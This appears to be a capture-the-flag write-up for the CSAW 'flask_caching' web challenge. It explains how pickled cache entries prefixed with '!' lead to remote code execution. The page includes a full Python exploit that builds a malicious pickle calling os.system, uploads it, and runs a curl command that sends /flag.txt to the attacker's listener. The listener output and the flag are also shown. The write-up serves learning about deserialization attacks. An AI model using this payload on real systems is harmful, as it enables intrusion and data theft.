@@ -1,0 +1,88 @@
+<h1>flask_caching</h1>
+
+<p>Author: <a href="https://github.com/roerohan">roerohan</a> and <a href="https://github.com/thebongy">thebongy</a></p>
+
+<h1>Requirements</h1>
+
+<ul>
+<li>Python</li>
+</ul>
+
+<h1>Source</h1>
+
+<ul>
+<li><a href="./app.py">app.py</a></li>
+</ul>
+
+<p>```
+cache all the things (this is python3)</p>
+
+<p>http://web.chal.csaw.io:5000
+```</p>
+
+<h1>Exploitation</h1>
+
+<p>```py</p>
+
+<h1>app.py</h1>
+
+<p>from flask_caching import Cache
+```</p>
+
+<p>When you look at the documentation for the source for the <code>flask_caching</code> module, you can optionally store a python pickle in the redis by prepending it with <code>'!'</code>. You can use python pickles for RCE, when the caching modules uses <code>pickle.load()</code> to load the cached data.</p>
+
+<p>Set up a netcat listener on your server and run the following script with your IP and PORT.</p>
+
+<p>```py
+import pickle
+import sys
+import base64
+import requests
+import time</p>
+
+<p>IP = '0.0.0.0' # Your IP here
+PORT = 8000
+DEFAULT<em>COMMAND=f'curl -d "$(cat /flag.txt)" {IP}:{PORT}'
+COMMAND = sys.argv[1] if len(sys.argv) &gt; 1 else DEFAULT</em>COMMAND</p>
+
+<p>class PickleRce(object):
+    def <strong>reduce</strong>(self):
+        import os
+        return (os.system,(COMMAND,))</p>
+
+<p>f = open('payload', 'wb')
+f.write(b'!'+pickle.dumps(PickleRce()))
+f.close()</p>
+
+<p>time.sleep(0.5)</p>
+
+<p>data = open('payload', 'rb').read()
+print(data)
+url = 'http://web.chal.csaw.io:5000/'</p>
+
+<p>test = 'test23'</p>
+
+<p>requests.post(url, files={ 'content': ('content', open('payload', 'rb').read()) }, data={ 'title': f'flask<em>cache</em>view//{test}' })</p>
+
+<p>r = requests.get(url + test)
+print(r.text)
+```</p>
+
+<p>On your netcat listener, you would get:</p>
+
+<p>```
+POST / HTTP/1.1
+Host: yourhost:yourport
+User-Agent: curl/7.69.1
+Accept: <em>/</em>
+Content-Length: 16
+Content-Type: application/x-www-form-urlencoded</p>
+
+<p>flag{f1@sK_10rD}
+```</p>
+
+<p>The flag is:</p>
+
+<p><code>
+flag{f1@sK_10rD}
+</code></p>
